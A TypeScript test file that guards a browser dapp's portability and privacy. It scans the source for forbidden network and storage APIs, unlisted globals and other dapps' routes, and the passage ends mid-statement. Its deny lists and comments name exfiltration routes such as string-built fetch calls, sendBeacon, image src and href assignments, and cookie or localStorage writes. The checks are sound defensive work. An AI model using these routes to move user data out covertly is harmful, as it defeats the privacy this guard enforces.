// The DEC-14 guard — turns "the decode dapp is portable into any DxKit shell, with no
// dotdev-specific coupling" from a claim into an enforced invariant, and carries this phase's
// two D-17 privacy assertions (no network, no persistent storage) as the same kind of check.
//
// Written now, in wave 2, while there is nothing in the directory to fix — Phases 5 and 6 are
// where Ethereum-specific work arrives and this shell's own ethereum plugin sits right there,
// tempting. A guard with nothing to catch today costs nothing; a guard added after the first
// coupling has shipped catches nothing.
//
// The scan reads TypeScript SOURCE TEXT, never compiled output — see the file-collector below.
// It deliberately does not use the TypeScript compiler's symbol resolution: over-collecting
// candidate identifiers and exempting the known-safe ones fails CLOSED (a genuinely new global
// gets somebody's attention), where a resolver that cannot classify something would fail open.
// That trade is explained in full beside extractExpressionCandidates() below.

import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { resolve } from 'node:path';
import { describe, expect, it } from 'vitest';

const SRC = resolve(__dirname, '../src');
const DAPPS_DIR = resolve(SRC, 'dapps');
const DECODE_DIR = resolve(DAPPS_DIR, 'decode');

// ── File collection (must_haves: "fails rather than passes if that scan finds zero files") ──

// The TypeScript modules, the declaration file, the template and the stylesheet — never
// manifest.json (its two portability fields are asserted directly, below) and never compiled
// .js output (this guard is a statement about what was written, not about what happened to
// compile — see the "no build step" note on the source-only design in the plan).
//
// D-04: RECURSIVE, closing a latent hole — the original version filtered readdirSync's own
// (non-recursive) listing, so a `src/dapps/decode/net/` subdirectory would have escaped every
// scan below silently. Chosen over "assert the directory stays flat" because a real subdirectory
// is not hypothetical here forever (04 D-01/D-02 forbid one today only for a `.gitignore`-glob
// reason, not a portability one) and a collector that actually finds nested files is a stronger
// guarantee than a collector that refuses to let them exist. The existing filter (`.ts` /
// `template.html` / `style.css`) is unchanged; only the walk is new.
function collectDecodeSourceFiles(dir: string): string[] {
  if (!existsSync(dir)) return [];
  const out: string[] = [];
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const full = resolve(dir, entry.name);
    if (entry.isDirectory()) {
      out.push(...collectDecodeSourceFiles(full));
      continue;
    }
    if (entry.name.endsWith('.ts') || entry.name === 'template.html' || entry.name === 'style.css') {
      out.push(full);
    }
  }
  return out.sort();
}

// ── Comment-and-string stripping (shared by every forbidden scan except the id/route one) ──

// Removes `//` line comments, `/* */` block comments, and single/double/template-quoted string
// literals from TypeScript source text, returning the remaining code plus the literal contents
// of every string it removed. This repo's comment style names APIs in prose constantly
// (src/main.ts:1-31, src/shell-wallet.ts:154-206), plan 03-03 asks core.ts to carry comments
// about the transport seam Phase 5 fills, and the D-17 privacy sentence ui.ts prints in Phase 3
// wave 3 is itself a sentence about network requests and storage — a guard that failed on the
// sentence stating the guarantee would be a guard nobody could satisfy while telling the truth.
//
// Simplification, stated rather than hidden: this is a character scanner, not a full
// tokenizer. It DOES recognize `/regex/flags` literals (below) well enough to keep a flag
// letter like the `i` in `/^0x/i` from being read as a bare identifier — decoders.ts and
// codecs.ts both use exactly that shape — but the regex/division disambiguation is a heuristic
// (preceding-token context), not a real parser's.
//
// Heuristic: `/` starts a regex literal when the nearest preceding non-whitespace token is
// punctuation that expects an expression next (`(`, `,`, `=`, `:`, `[`, `!`, `&`, `|`, `?`,
// `{`, `;`, start-of-text) or one of a short list of expression-position keywords (`return`,
// `typeof`, `in`, `of`, `new`, `instanceof`, `case`, `do`, `else`, `yield`, `void`). Anything
// else (an identifier, a number, `)`, `]`) means the previous token was a VALUE, so `/` divides
// it instead. `bytes.length / 2` (codecs.ts) is exactly the division case this rule protects.
const REGEX_CONTEXT_KEYWORDS = new Set([
  'return',
  'typeof',
  'in',
  'of',
  'new',
  'instanceof',
  'case',
  'do',
  'else',
  'yield',
  'void',
]);

function isRegexContext(code: string): boolean {
  let k = code.length - 1;
  while (k >= 0 && /\s/.test(code[k])) k--;
  if (k < 0) return true;
  const c = code[k];
  if (/[A-Za-z0-9_$)\]]/.test(c)) {
    let wStart = k;
    while (wStart >= 0 && /[A-Za-z0-9_$]/.test(code[wStart])) wStart--;
    wStart++;
    const word = code.slice(wStart, k + 1);
    return /[A-Za-z_$]/.test(c) && REGEX_CONTEXT_KEYWORDS.has(word);
  }
  return true;
}

function stripCommentsAndStrings(text: string): { code: string; strings: string[] } {
  let code = '';
  const strings: string[] = [];
  const n = text.length;
  let i = 0;
  while (i < n) {
    const c = text[i];
    const c2 = i + 1 < n ? text[i + 1] : '';
    if (c === '/' && c2 === '/') {
      i += 2;
      while (i < n && text[i] !== '\n') i++;
      continue;
    }
    if (c === '/' && c2 === '*') {
      i += 2;
      while (i < n && !(text[i] === '*' && text[i + 1] === '/')) i++;
      i += 2;
      continue;
    }
    if (c === '/' && c2 !== '/' && c2 !== '*' && isRegexContext(code)) {
      let j = i + 1;
      let inClass = false;
      let closed = false;
      while (j < n && text[j] !== '\n') {
        if (text[j] === '\\' && j + 1 < n) {
          j += 2;
          continue;
        }
        if (text[j] === '[') {
          inClass = true;
          j++;
          continue;
        }
        if (text[j] === ']') {
          inClass = false;
          j++;
          continue;
        }
        if (text[j] === '/' && !inClass) {
          j++;
          closed = true;
          break;
        }
        j++;
      }
      if (closed) {
        while (j < n && /[a-zA-Z]/.test(text[j])) j++;
        i = j;
        continue;
      }
      // Not actually a regex literal (no unescaped closing `/` before end of line) — fall
      // through and treat the `/` as an ordinary character.
    }
    if (c === "'" || c === '"' || c === '`') {
      const quote = c;
      let j = i + 1;
      let buf = '';
      while (j < n && text[j] !== quote) {
        if (text[j] === '\\' && j + 1 < n) {
          buf += text[j] + text[j + 1];
          j += 2;
          continue;
        }
        buf += text[j];
        j++;
      }
      strings.push(buf);
      i = j + 1;
      continue;
    }
    code += c;
    i++;
  }
  return { code, strings };
}

// Comments removed, string and template literal content RETAINED verbatim (quotes included).
// A structural companion to stripCommentsAndStrings above, for the forbidden network/storage
// scans below: an exfiltration or persistence call built from a string — `window['fetch'](...)`,
// `window['localStorage'].setItem(...)` — must still be caught, and stripping the string (as
// stripCommentsAndStrings does, for the allowlist and other-dapp checks) would silently hide
// exactly that shape (WR-01). Regex literals are kept verbatim too, for the same reason a
// division is not misread as an unterminated regex above — this function reuses that same
// isRegexContext heuristic, fed the growing retained-string output.
function stripComments(text: string): string {
  let code = '';
  const n = text.length;
  let i = 0;
  while (i < n) {
    const c = text[i];
    const c2 = i + 1 < n ? text[i + 1] : '';
    if (c === '/' && c2 === '/') {
      i += 2;
      while (i < n && text[i] !== '\n') i++;
      continue;
    }
    if (c === '/' && c2 === '*') {
      i += 2;
      while (i < n && !(text[i] === '*' && text[i + 1] === '/')) i++;
      i += 2;
      continue;
    }
    if (c === '/' && c2 !== '/' && c2 !== '*' && isRegexContext(code)) {
      let j = i + 1;
      let inClass = false;
      let closed = false;
      while (j < n && text[j] !== '\n') {
        if (text[j] === '\\' && j + 1 < n) {
          j += 2;
          continue;
        }
        if (text[j] === '[') {
          inClass = true;
          j++;
          continue;
        }
        if (text[j] === ']') {
          inClass = false;
          j++;
          continue;
        }
        if (text[j] === '/' && !inClass) {
          j++;
          closed = true;
          break;
        }
        j++;
      }
      if (closed) {
        while (j < n && /[a-zA-Z]/.test(text[j])) j++;
        code += text.slice(i, j);
        i = j;
        continue;
      }
      // Not actually a regex literal — same fallthrough as stripCommentsAndStrings.
    }
    if (c === "'" || c === '"' || c === '`') {
      const quote = c;
      let j = i + 1;
      while (j < n && text[j] !== quote) {
        if (text[j] === '\\' && j + 1 < n) {
          j += 2;
          continue;
        }
        j++;
      }
      code += text.slice(i, Math.min(j + 1, n)); // keep the string literal verbatim, quotes included
      i = j + 1;
      continue;
    }
    code += c;
    i++;
  }
  return code;
}

// Removes the BODY of every `interface NAME ... { ... }` and `type NAME = ... ;` declaration
// (balanced over braces/parens/brackets/angle-brackets) from already comment-and-string-
// stripped code. Type declarations are exactly where this guard's own contract file
// (types.d.ts) lives — the whole file is ambient declarations and none of it runs at run time —
// and where the few remaining per-file type declarations (dapp.ts's Window augmentation and
// DxMountEvent) live too. WR-02 folded the local interface extensions that used to scatter this
// contract across four files (HexCodecWithNormalize, DxDecodeCoreModuleWithHelpers,
// AutoDetectResolution, and others) back into types.d.ts, closing the declaration-merge risk
// this guard's own header calls out — but the stripping still matters for what remains. Only
// used for the permitted-globals allowlist check below: the forbidden scans
// (org prefix, network, storage, other-dapp id/route) intentionally do NOT strip type
// declarations, because an org-prefixed identifier or another dapp's route named inside a type
// is exactly as much a coupling as one named in a runtime expression.
function stripTypeDeclarations(code: string): string {
  const declStart = /\b(?:interface|type)\s+[A-Za-z_$][A-Za-z0-9_$]*/g;
  let result = '';
  let lastEnd = 0;
  let match: RegExpExecArray | null = declStart.exec(code);
  while (match !== null) {
    const start = match.index;
    if (start < lastEnd) {
      match = declStart.exec(code);
      continue;
    }
    result += code.slice(lastEnd, start);
    let j = match.index + match[0].length;
    let depth = 0;
    let sawBrace = false;
    let end = code.length;
    for (; j < code.length; j++) {
      const ch = code[j];
      // Angle brackets are deliberately NOT tracked as a bracket pair: a generic's `<...>`
      // never needs balancing for the "find the closing brace" purpose below, and TRACKING it
      // would misread the `>` in an arrow function's `=>` (`(entries: LogEntry[]) => void`,
      // used inside LogPort's own subscribe() signature) as a generic close, sending depth
      // negative and losing the interface's real end entirely.
      if (ch === '{' || ch === '(' || ch === '[') {
        depth++;
        if (ch === '{') sawBrace = true;
      } else if (ch === '}' || ch === ')' || ch === ']') {
        depth--;
        if (depth === 0 && sawBrace && ch === '}') {
          end = j + 1;
          break;
        }
      } else if (ch === ';' && depth === 0) {
        end = j + 1;
        break;
      }
    }
    lastEnd = end;
    declStart.lastIndex = end;
    match = declStart.exec(code);
  }
  result += code.slice(lastEnd);
  return result;
}

// ── Locally-declared identifiers ─────────────────────────────────────────────────────────

// A structural companion to the two exemption arrays below, for the same over-collection
// Codex's objection names: `registry.register()` and `codec.decode()` match the same textual
// shape as a real global reference (a bare identifier followed by `.`/`(`/`[`). Property and
// method NAMES are already excluded (extractExpressionCandidates skips anything preceded by
// `.`), but the BASE of that chain — `registry`, `codec`, `core`, `decoder` — is a local
// const/let/param, not a global, and nothing about its syntax says so. Collecting every name
// this file declares (const/let/var, destructured bindings, function/arrow parameters, catch
// clauses, for-loop bindings) and excluding them from candidacy is the five-file-directory
// answer to the same problem a full TypeScript-compiler symbol resolution would solve exactly;
// see the file header for why that heavier tool is not what this guard reaches for.
function collectDeclaredNames(code: string): Set<string> {
  const names = new Set<string>();
  const ID = '[A-Za-z_$][A-Za-z0-9_$]*';

  for (const m of code.matchAll(new RegExp(`\\b(?:const|let|var)\\s+(${ID})`, 'g'))) {
    names.add(m[1]);
  }
  for (const m of code.matchAll(/\b(?:const|let|var)\s*\{([^}]*)\}/g)) {
    for (const part of m[1].split(',')) {
      const trimmed = part.trim();
      if (!trimmed) continue;
      const afterColon = trimmed.includes(':') ? trimmed.split(':')[1] : trimmed;
      const nameMatch = afterColon
        .trim()
        .split('=')[0]
        .trim()
        .match(new RegExp(`^(${ID})`));
      if (nameMatch) names.add(nameMatch[1]);
    }
  }
  for (const m of code.matchAll(/\b(?:const|let|var)\s*\[([^\]]*)\]/g)) {
    for (const part of m[1].split(',')) {
      const nameMatch = part.trim().match(new RegExp(`^(${ID})`));
      if (nameMatch) names.add(nameMatch[1]);
    }
  }
  for (const m of code.matchAll(new RegExp(`\\bfunction\\s+(${ID})`, 'g'))) {
    names.add(m[1]);
  }
  // Every non-nested parenthesized group — covers function-declaration and arrow-function
  // parameter lists. Deliberately broad: it also matches a call's argument list, but a bare
  // identifier passed as an argument is either already declared elsewhere (harmless double
  // counting) or not itself a member/call/index candidate at that position (see the "followed
  // by" check below) — so the over-match here costs nothing in this directory.
  for (const m of code.matchAll(/\(([^()]*)\)/g)) {
    for (const part of m[1].split(',')) {
      const trimmed = part.trim();
      if (!trimmed) continue;
      const nameMatch = trimmed.match(new RegExp(`^(${ID})`));
      if (nameMatch) names.add(nameMatch[1]);
    }
  }
  for (const m of code.matchAll(new RegExp(`\\bcatch\\s*\\(\\s*(${ID})`, 'g'))) {
    names.add(m[1]);
  }
  for (const m of code.matchAll(new RegExp(`\\bfor\\s*\\(\\s*(?:const|let|var)\\s+(${ID})`, 'g'))) {
    names.add(m[1]);
  }
  return names;
}

// ── Runtime expression-position candidate extraction ─────────────────────────────────────

// A candidate global reference is an identifier being *used at run time*: immediately preceded
// by `new`, or immediately followed by a member access (`.`), a call (`(`), or an index (`[`).
// Excluded structurally, without knowing a single DOM interface name: an identifier immediately
// preceded by `.` (a property/method NAME, not a base reference), by `:` (a type-annotation
// slot — `entries: LogEntry[]` never means LogEntry is used at run time), or by the word `as`
// (a cast target — `raw as HTMLTextAreaElement[]`). This is what keeps every DOM interface name
// this dapp's `ui.ts`/`dapp.ts` use as annotations and casts out of the guard's face without the
// guard having to enumerate the DOM's type inventory.

// Distinguishes a call (`fetch("/x")`) from an object-literal method-shorthand DEFINITION
// (`register(decoder) { ... }`, `decode(bytes: Uint8Array): string | null { ... }`) — both are
// a bare identifier immediately followed by `(` in this codebase's formatting (no space before
// either a call's or a method's parens), so adjacency alone cannot tell them apart. A
// definition's parameter list is followed — once an optional return-type annotation after `:`
// is skipped — by a function body's opening `{`; a call's closing paren is not. registry.ts's
// register/get/list/size and every other returned-object-literal method in core.ts are what
// this rule exists to keep off the allowlist's back — they are declarations, not references.
function isMethodDefinition(code: string, openParenIndex: number): boolean {
  let depth = 0;
  let j = openParenIndex;
  for (; j < code.length; j++) {
    if (code[j] === '(') depth++;
    else if (code[j] === ')') {
      depth--;
      if (depth === 0) {
        j++;
        break;
      }
    }
  }
  while (j < code.length && /\s/.test(code[j])) j++;
  if (code[j] === ':') {
    j++;
    while (j < code.length && code[j] !== '{' && code[j] !== ';' && code[j] !== ',' && code[j] !== ')') j++;
  }
  return code[j] === '{';
}

function extractExpressionCandidates(code: string): string[] {
  const candidates: string[] = [];
  const re = /[A-Za-z_$][A-Za-z0-9_$]*/g;
  let match: RegExpExecArray | null = re.exec(code);
  while (match !== null) {
    const name = match[0];
    const start = match.index;
    const end = start + name.length;

    let k = start - 1;
    while (k >= 0 && /\s/.test(code[k])) k--;
    const prevChar = k >= 0 ? code[k] : '';

    if (prevChar === '.' || prevChar === ':') {
      match = re.exec(code);
      continue;
    }

    let wStart = k;
    while (wStart >= 0 && /[A-Za-z0-9_$]/.test(code[wStart])) wStart--;
    wStart++;
    const prevWord = k >= 0 ? code.slice(wStart, k + 1) : '';

    if (prevWord === 'as') {
      match = re.exec(code);
      continue;
    }

    const precededByNew = prevWord === 'new';
    const after = end < code.length ? code[end] : '';
    const followedByAccess = (after === '(' && !isMethodDefinition(code, end)) || after === '.' || after === '[';

    if (precededByNew || followedByAccess) candidates.push(name);
    match = re.exec(code);
  }
  return candidates;
}

// ── The permitted-globals allowlist — a literal policy, not a directory scan ─────────────

// Written from the phase contract (03-CONTEXT.md, this plan's own action), covering every
// platform global plans 03-03, 03-05 and 03-06 legitimately reach for, not just what is on disk
// today — see the dedicated coverage test below. Adding an entry here is a deliberate act with
// a stated reason; that is what makes this array a policy rather than a log.
const ALLOWED_GLOBALS = [
  'DxDecode',
  'window',
  '__DXKIT__',
  'globalThis',
  'document',
  'TextDecoder',
  'TextEncoder',
  'atob',
  'btoa',
  'AbortController',
  'AbortSignal',
  // Base identifier only — `navigator.sendBeacon` is still caught by the network scan below,
  // which matches `sendBeacon` by name regardless of what it is a member of.
  'navigator',
  'setTimeout',
  'clearTimeout',
  'URLSearchParams',
  'URL',
  'location',
  'history',
  'CompressionStream',
  'DecompressionStream',
  'Blob',
  // Response is allowlisted and fetch is NOT: `new Response(stream)` is how plan 03-06 drains a
  // compression stream to bytes (RESEARCH.md Pattern 6) and makes no request of its own — the
  // same distinction `new URL(...)` composing a link (not fetching it) already draws above.
  'Response',
];

// getSelection is deliberately absent — plan 03-05's non-clipboard copy fallback follows
// src/shell-wallet.ts's revealFullAddress shape (focus()+select() on the field element), which
// reaches no global at all. See the dedicated test below.

// No policy carried here — the language's own globals, added without ceremony by whoever next
// finds one missing.
const ECMASCRIPT_BUILTINS = [
  'Uint8Array',
  'BigInt',
  'Map',
  'Set',
  // 05-04: ui.ts's Log-row expansion state (NET-06) — keyed on entry object identity, a
  // language builtin, not a network or storage primitive.
  'WeakSet',
  'JSON',
  'Math',
  'Object',
  'Array',
  'Number',
  'String',
  'Date',
  'Promise',
  'Error',
  // 04-02: decoders-url.ts's Percent.decode (codecs.ts) wraps this in try/catch at the codec
  // boundary — a language builtin, not a network or storage primitive.
  'decodeURIComponent',
  // 05-01: keccak.ts's split-lane sponge state (D-17) — a typed array, not a network/storage
  // primitive.
  'Uint32Array',
];

function isAllowedGlobal(name: string): boolean {
  // Whole-identifier equality, never prefix or substring containment — a name that starts with
  // an allowed name and continues past it is a different name and must be reported.
  return ALLOWED_GLOBALS.includes(name) || ECMASCRIPT_BUILTINS.includes(name);
}

function checkAllowlistViolations(strippedCode: string): string[] {
  const runtimeOnly = stripTypeDeclarations(strippedCode);
  const declared = collectDeclaredNames(runtimeOnly);
  const candidates = extractExpressionCandidates(runtimeOnly);
  const violations = new Set<string>();
  for (const name of candidates) {
    if (isAllowedGlobal(name)) continue;
    if (declared.has(name)) continue;
    violations.add(name);
  }
  return [...violations];
}

// ── Forbidden identifiers — network and browser persistent storage ───────────────────────

// The honest form of the claim: a token scan cannot prove "no network request happens on this
// page" — DxKit's own lifecycle manager fetches this dapp's template.html during mount. What it
// proves is that no CODE in this directory can make one, and therefore that nothing this dapp
// decodes is transmitted. That is the wording every violation message below uses.
// WR-01: extended past the original five/four. `open`/`href`/`src`/`srcset`/`action` catch a
// property-assignment or bracket-notation exfiltration path (`location.href = …`,
// `document.createElement('img').src = …`, `window['fetch'](…)`) that a base-identifier-only list
// missed entirely; `Image`/`Audio`/`Worker`/`SharedWorker`/`importScripts` are the same family of
// escape hatch reached a different way. `cookie`/`caches`/`storage` close the equivalent gap on
// the persistence side. These run against stripComments' output (below), not the fully-stripped
// `code` — see scanSourceFile.
const NETWORK_IDENTIFIERS = [
  'fetch',
  'XMLHttpRequest',
  'sendBeacon',
  'WebSocket',
  'EventSource',
  'open',
  'href',
  'src',
  'srcset',
  'action',
  'importScripts',
  'Image',
  'Audio',
  'Worker',
  'SharedWorker',
];

// D-03: the one-file exemption (05-03). The trade, stated once, here: exactly one file —
// `transport.ts` — may name `fetch`, and in exchange the guard now asserts something STRONGER
// than the prohibition it narrows. Before this phase the claim was "no request can be made from
// this directory"; after it, the claim is "only one file can make a request, and every request
// it makes appears in the Log tab" — which is exactly what NET-05 promises anyway, so the guard
// enforces a product requirement instead of a prohibition the phase has outgrown. The exemption
// covers ONLY the `fetch` identifier (checked below in scanSourceFile) — every other entry of
// NETWORK_IDENTIFIERS and every entry of STORAGE_IDENTIFIERS still applies to transport.ts in
// full; a whole-file exemption would quietly permit `localStorage` in the one file that also
// holds the user's api key, which is the opposite of what the narrowing is for.
const NETWORK_EXEMPT_FILES = ['transport.ts'];

// The single identifier NETWORK_EXEMPT_FILES exempts — never widen this to a set. Kept as its
// own named constant (not inlined as the string 'fetch') so the exemption-scoping check below
// reads as "the one identifier the exemption covers" rather than a magic string repeated twice.
const NETWORK_EXEMPTED_IDENTIFIER = 'fetch';

// D-03.2: the positive assertion that makes the narrowing honest. Every INVOCATION of
// NETWORK_EXEMPTED_IDENTIFIER inside the exempt file must sit inside the body of this one named
// function — the function that writes the LogEntry (05-03's transport.ts). Named here so the
// test and the module agree on one name rather than each restating it.
const LOG_WRITING_FUNCTION = 'netRequest';

// D-03 part 3 (05-06): the guard's SECOND narrowing — an anchor needs `href` in some form to be
// navigable at all, and ETH-10's explorer link cannot be rendered without one. The trade is the
// same shape as the fetch exemption above: exactly one file, `ui.ts`, may name `href`, and in
// exchange every actual construction site is required to sit inside exactly one named function.
// Every other entry of NETWORK_IDENTIFIERS and every entry of STORAGE_IDENTIFIERS still applies
// to ui.ts in full — this narrowing covers ONLY `href`, checked below in scanSourceFile.
const LINK_EXEMPT_FILES = ['ui.ts'];

// The single identifier LINK_EXEMPT_FILES exempts — never widen this to a set, matching
// NETWORK_EXEMPTED_IDENTIFIER's own precedent above.
const LINK_EXEMPTED_IDENTIFIER = 'href';

// D-03 part 3: the one named function permitted to construct a link target — asserted below to
// be the ONLY place `href` may appear anywhere in this directory. Unlike NETWORK_EXEMPTED_IDENTIFIER
// (a call, `fetch(...)`), `href` is written as a property (`anchor.href = target`), so its
// containment check (below) matches bare occurrences, not invocations.
const LINK_HELPER_NAME = 'uiCreateExternalLink';

const STORAGE_IDENTIFIERS = [
  'localStorage',
  'sessionStorage',
  'indexedDB',
  'openDatabase',
  'cookie',
  'caches',
  'storage',
];
const ORG_PREFIX_RE = /\bDnzn[A-Za-z0-9]*\b/g;

function checkForbidden(code: string, identifiers: string[]): string[] {
  const found: string[] = [];
  for (const id of identifiers) {
    if (new RegExp(`\\b${id}\\b`).test(code)) found.push(id);
  }
  return found;
}

function checkOrgPrefix(code: string): string[] {
  const matches = code.match(ORG_PREFIX_RE);
  return matches ? [...new Set(matches)] : [];
}

// ── D-03.2: fetch-invocation containment, for the one exempt file ────────────────────────

// Finds the byte range of `function <name>(...) { ... }`'s BODY (the braces and everything
// between them) inside already comment-and-string-stripped code. Returns null when the function
// is not declared at all — the containment check below then reports every invocation as
// out-of-bounds, which is correct: an exempt file with no log-writing function has nowhere safe
// for fetch to live. Balances only the parameter list's parens and the body's braces; does not
// need to handle generics or default-parameter object literals for this directory's own code.
function findFunctionBodyRange(code: string, functionName: string): { start: number; end: number } | null {
  const escaped = functionName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const decl = new RegExp(`\\bfunction\\s+${escaped}\\s*\\(`);
  const match = decl.exec(code);
  if (!match) return null;

  let i = match.index + match[0].length;
  let parenDepth = 1; // the '(' the regex already consumed
  while (i < code.length && parenDepth > 0) {
    if (code[i] === '(') parenDepth++;
    else if (code[i] === ')') parenDepth--;
    i++;
  }
  while (i < code.length && code[i] !== '{') i++;
  if (i >= code.length) return null;
  const start = i;

  let braceDepth = 0;
  let j = i;
  for (; j < code.length; j++) {
    if (code[j] === '{') braceDepth++;
    else if (code[j] === '}') {
      braceDepth--;
      if (braceDepth === 0) {
        j++;
        break;
      }
    }
  }
  return { start, end: j };
}

// Matches INVOCATIONS of `identifier` — the identifier immediately followed by an opening
// parenthesis, optional whitespace between — never bare occurrences. Run against
// comment-and-string-STRIPPED code (stripCommentsAndStrings' `code` output, never `commentsOnly`
// or raw content), so a mention of the identifier inside a string literal or a comment never
// reaches this scan at all — that is what proves the assertion scans invocations, not text. A
// bare-occurrence scan would be self-invalidating here: if a future refusal-detection ever
// matched the platform's own error text by string comparison, the identifier would appear inside
// a string literal outside the log-writing function and a text-level scan would report a
// perfectly correct file.
function findInvocationPositions(code: string, identifier: string): number[] {
  const re = new RegExp(`\\b${identifier}\\s*\\(`, 'g');
  const positions: number[] = [];
  let m: RegExpExecArray | null = re.exec(code);
  while (m !== null) {
    positions.push(m.index);
    m = re.exec(code);
  }
  return positions;
}

// The claim this asserts is a STRUCTURAL one — "only LOG_WRITING_FUNCTION may invoke
// NETWORK_EXEMPTED_IDENTIFIER" — and deliberately not a timing one. This scanner strips comments
// and matches identifiers; it is not control-flow analysis and cannot prove a log entry is
// written before every request or that every control path writes one. The completeness of
// logging (one entry per attempt) is the transport suite's own behavioural assertions to make,
// not this guard's.
function checkFetchInvocationContainment(code: string): string[] {
  const range = findFunctionBodyRange(code, LOG_WRITING_FUNCTION);
  const violations: string[] = [];
  for (const pos of findInvocationPositions(code, NETWORK_EXEMPTED_IDENTIFIER)) {
    const inside = range !== null && pos >= range.start && pos < range.end;
    if (!inside) {
      violations.push(
        `invokes "${NETWORK_EXEMPTED_IDENTIFIER}" outside ${LOG_WRITING_FUNCTION}() — only that function may invoke the network primitive`,
      );
    }
  }
  return violations;
}

// D-03 part 3 (05-06): the second and final narrowing of this guard's link-identifier claim.
// `href` is permitted only inside `uiCreateExternalLink`'s own body, in `ui.ts`, and nowhere
// else in the directory. Unlike the fetch exemption above, `href` is never INVOKED — it is
// written as a property (`anchor.href = target`) — so containment here is bare-occurrence, not
// call-shaped, but the structural claim is the same: this identifier appears in exactly one
// place, and only that place.
function checkLinkContainment(code: string): string[] {
  const range = findFunctionBodyRange(code, LINK_HELPER_NAME);
  const violations: string[] = [];
  const re = new RegExp(`\\b${LINK_EXEMPTED_IDENTIFIER}\\b`, 'g');
  let m: RegExpExecArray | null = re.exec(code);
  while (m !== null) {
    const inside = range !== null && m.index >= range.start && m.index < range.end;
    if (!inside) {
      violations.push(
        `references "${LINK_EXEMPTED_IDENTIFIER}" outside ${LINK_HELPER_NAME}() — only that function may construct a link target`,
      );
    }
    m = re.exec(code);
  }
  return violations;
}

// ── The other-dapp id and route lists, derived from the manifests on disk ─────────────────

function loadAllManifests(): { id: string; route: string }[] {
  return readdirSync(DAPPS_DIR, { withFileTypes: true })
    .filter((d) => d.isDirectory())
    .map((d) => JSON.parse(readFileSync(resolve(DAPPS_DIR, d.name, 'manifest.json'), 'utf-8')));
}

const ALL_MANIFESTS = loadAllManifests();
const DECODE_MANIFEST = ALL_MANIFESTS.find((m) => m.id === 'decode');
const OTHER_MANIFESTS = ALL_MANIFESTS.filter((m) => m.id !== 'decode');

// Rule 1: exclude decode's own manifest — done above via the filter.
// Rule 2 (applied at match time, in checkOtherDappCoupling): whole-identifier match inside
// string literals only — `tpl`/`cic` are not literal substrings of "template"/"specific" (both
// require consecutive letters neither word contains), but whole-identifier matching is the
// correct rule regardless of that arithmetic, and is what the word-boundary regex below applies.
// Rule 3: a route counts only when it starts with `/` and is longer than one character —
// `about`'s route is `/`, a substring of every file on disk including this one.
// Rule 4: `settings` is exempt from the ID list — decode's own manifest is OBLIGED to contain
// it (`requires.plugins: ["settings"]`, enforced by DxKit's lifecycle manager at mount, per
// D-12) — but its ROUTE stays forbidden below; naming `/settings` is still the coupling D-12
// exists to avoid.
const OTHER_DAPP_IDS = OTHER_MANIFESTS.map((m) => m.id).filter((id) => id !== 'settings');
const OTHER_DAPP_ROUTES = OTHER_MANIFESTS.map((m) => m.route).filter((r) => r.startsWith('/') && r.length > 1);

// WR-03: decode's OWN route, forbidden as a literal too — OTHER_DAPP_ROUTES excludes decode's
// own manifest by design (Rule 1 above), which is exactly why core.ts's `#/tools/decode/?`
// hardcode was invisible to this guard until now. A portable dapp derives its own route from
// the host at mount time (core.findOwnRoute); it never states it as a literal anywhere in its
// own source.
const DECODE_OWN_ROUTE = DECODE_MANIFEST?.route ?? null;

function checkOwnRouteLiteral(strings: string[]): string[] {
  if (!DECODE_OWN_ROUTE) return [];
  return strings.some((s) => s.includes(DECODE_OWN_ROUTE))
    ? [
        `hardcodes this dapp's own route "${DECODE_OWN_ROUTE}" as a literal — derive it from the host's manifest instead`,
      ]
    : [];
}

function checkOtherDappCoupling(strings: string[]): string[] {
  const violations: string[] = [];
  for (const id of OTHER_DAPP_IDS) {
    const re = new RegExp(`\\b${id}\\b`);
    if (strings.some((s) => re.test(s))) {
      violations.push(`names another dapp's id "${id}" in a string literal`);
    }
  }
  for (const route of OTHER_DAPP_ROUTES) {
    if (strings.some((s) => s.includes(route))) {
      violations.push(`names another dapp's route "${route}" in a string literal`);
    }
  }
  violations.push(...checkOwnRouteLiteral(strings));
  return violations;
}

// ── Per-file scan, aggregating every rule ─────────────────────────────────────────────────

// The forbidden scans (org prefix, network, storage) are NOT narrowed by the expression-
// position rule and NOT widened by it either — they run over the same comment-and-string-
// stripped text, matching their forbidden identifiers anywhere in it. Stripping removes prose,
// not code. The expression rule only narrows what must be justified (the allowlist check);
// nothing narrows what is forbidden except the removal of comments and literals.
function scanSourceFile(name: string, content: string): string[] {
  const { code, strings } = stripCommentsAndStrings(content);
  // WR-01: the network/storage scans read this — comments stripped, string literals RETAINED —
  // rather than `code`. A string-built call (`window['fetch'](…)`) or a property assignment
  // (`location.href = …`) is exactly as much a violation as a bare call, and `code` has already
  // thrown both of those away.
  const commentsOnly = stripComments(content);
  const violations: string[] = [];
  const isTypeScript = name.endsWith('.ts');
  // D-03.1: the exemption covers exactly this one file and exactly this one identifier — every
  // other network identifier and every storage identifier below still runs against it unchanged.
  const isNetworkExempt = NETWORK_EXEMPT_FILES.includes(name);
  // D-03 part 3: same shape, for the link helper's `href` exemption.
  const isLinkExempt = LINK_EXEMPT_FILES.includes(name);

  for (const v of checkOrgPrefix(code)) {
    violations.push(`${name}: org-prefixed identifier "${v}"`);
  }
  for (const v of checkForbidden(commentsOnly, NETWORK_IDENTIFIERS)) {
    if (isNetworkExempt && v === NETWORK_EXEMPTED_IDENTIFIER) continue;
    if (isLinkExempt && v === LINK_EXEMPTED_IDENTIFIER) continue;
    violations.push(
      `${name}: references a network-request API ("${v}") — no code in this directory can make a request, ` +
        `except ${NETWORK_EXEMPT_FILES.join(', ')}, and only inside ${LOG_WRITING_FUNCTION}(), ` +
        'so nothing it decodes is transmitted anywhere else',
    );
  }
  if (isNetworkExempt) {
    for (const v of checkFetchInvocationContainment(code)) {
      violations.push(`${name}: ${v}`);
    }
  }
  if (isLinkExempt) {
    for (const v of checkLinkContainment(code)) {
      violations.push(`${name}: ${v}`);
    }
  }
  for (const v of checkForbidden(commentsOnly, STORAGE_IDENTIFIERS)) {
    violations.push(`${name}: references a browser persistent-storage API ("${v}")`);
  }
  // CSS has no JS-shaped runtime global references — var()/rgba()/minmax() etc. would
  // otherwise be misread as unlisted globals by the same rule that flags `window.foo()`.
  if (isTypeScript) {
    for (const v of checkAllowlistViolations(code)) {
